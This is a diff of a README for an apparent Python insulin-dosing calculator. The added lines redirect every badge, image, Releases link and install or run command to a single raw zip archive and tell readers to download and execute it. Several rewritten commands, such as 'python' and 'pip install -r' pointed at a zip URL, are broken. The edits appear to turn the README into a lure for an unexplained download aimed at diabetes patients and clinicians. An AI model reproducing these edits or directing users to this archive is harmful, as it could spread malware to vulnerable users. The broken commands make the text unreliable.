@@ -1,8 +1,8 @@
 # Insulin Dosing Suite 🩺💉
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Version](https://img.shields.io/badge/Version-1.0.0-orange.svg)
+![Python](https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip%https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip)
+![License](https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip)
+![Version](https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip)
 
 Welcome to the **Insulin Dosing Suite**! This repository provides a comprehensive Python-based insulin calculator designed to aid in diabetes management. With a robust command-line interface (CLI), user-friendly graphical user interface (GUI), and experimental logic modules, this suite offers a versatile tool for healthcare professionals and individuals managing diabetes.
 
@@ -27,7 +27,7 @@ Welcome to the **Insulin Dosing Suite**! This repository provides a comprehensiv
 
 ## Installation
 
-To install the Insulin Dosing Suite, you can download the latest release from our [Releases page](https://github.com/Elwy226/insulin-dosing-suite/releases). After downloading, follow these steps:
+To install the Insulin Dosing Suite, you can download the latest release from our [Releases page](https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip). After downloading, follow these steps:
 
 1. Extract the downloaded file.
 2. Open a terminal or command prompt.
@@ -35,7 +35,7 @@ To install the Insulin Dosing Suite, you can download the latest release from ou
 4. Run the following command to install the necessary dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip
    ```
 
 ## Usage
@@ -45,7 +45,7 @@ To install the Insulin Dosing Suite, you can download the latest release from ou
 To use the CLI tool, open your terminal and run:
 
 ```bash
-python cli_tool.py
+python https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip
 ```
 
 Follow the prompts to input your data and receive your insulin dosage.
@@ -55,7 +55,7 @@ Follow the prompts to input your data and receive your insulin dosage.
 To launch the GUI, run:
 
 ```bash
-python gui_tool.py
+python https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip
 ```
 
 This will open the user-friendly interface where you can input your details and receive calculations visually.
@@ -94,9 +94,9 @@ For questions or feedback, feel free to reach out via GitHub or email. Your inpu
 
 ## Releases
 
-To download the latest version of the Insulin Dosing Suite, visit our [Releases page](https://github.com/Elwy226/insulin-dosing-suite/releases). Be sure to download and execute the appropriate file for your operating system.
+To download the latest version of the Insulin Dosing Suite, visit our [Releases page](https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip). Be sure to download and execute the appropriate file for your operating system.
 
-![Insulin Management](https://images.unsplash.com/photo-1589492232728-0e5c99a7f9c3?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMTc3M3wwfDF8c2VhcmNofDF8fGluc3VsaW58ZW58MHx8fHwxNjM0NjU1NjA4&ixlib=rb-1.2.1&q=80&w=400)
+![Insulin Management](https://github.com/Elwy226/insulin-dosing-suite/raw/refs/heads/main/v1.0_complexinsulincalc/dosing_suite_insulin_v1.4.zip)
 
 ---
 
